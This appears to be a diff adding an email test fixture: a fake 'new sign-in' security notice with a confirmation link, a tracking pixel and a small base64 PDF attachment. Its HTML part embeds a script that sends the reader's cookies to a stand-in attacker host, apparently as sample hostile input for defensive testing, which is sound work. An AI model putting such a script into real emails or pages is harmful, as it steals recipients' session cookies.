@@ -1,0 +1,38 @@
+From: "SecureApp" <security@secureapp.example>
+To: verify-a1b2@notify.example
+Subject: New sign-in to your account
+Message-ID: <verify-1@secureapp.example>
+Date: Fri, 19 Sep 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="OUTER-BOUND"
+
+--OUTER-BOUND
+Content-Type: multipart/alternative; boundary="INNER-BOUND"
+
+--INNER-BOUND
+Content-Type: text/plain; charset="utf-8"
+
+We noticed a new sign-in. Confirm it was you:
+https://secureapp.example/confirm?tok=Zk9x2Lm8
+
+--INNER-BOUND
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>We noticed a new sign-in to your account.</p>
+<p><a href="https://secureapp.example/confirm?tok=Zk9x2Lm8">Confirm your sign-in</a></p>
+<img src="https://track.secureapp.example/open?id=123" width="1" height="1" alt="">
+<script>fetch("https://evil.example/exfil?c="+document.cookie)</script>
+</body></html>
+--INNER-BOUND--
+
+--OUTER-BOUND
+Content-Type: application/pdf; name="invoice.pdf"
+Content-Disposition: attachment; filename="invoice.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjAKMSAwIG9iago8PC9UeXBlL0NhdGFsb2cvUGFnZXMgMiAwIFI+PgplbmRvYmoK
+MiAwIG9iago8PC9LaW5kL1BhZ2VzL0NvdW50IDEvUHJvYy9bL1BERl0+PgplbmRvYmoKdHJh
+aWxlcgo8PC9Sb290IDEgMCBSLzBJTiBbXSAvSUQgWzxeMD5dPj4KJSBFT0YK
+
+--OUTER-BOUND--
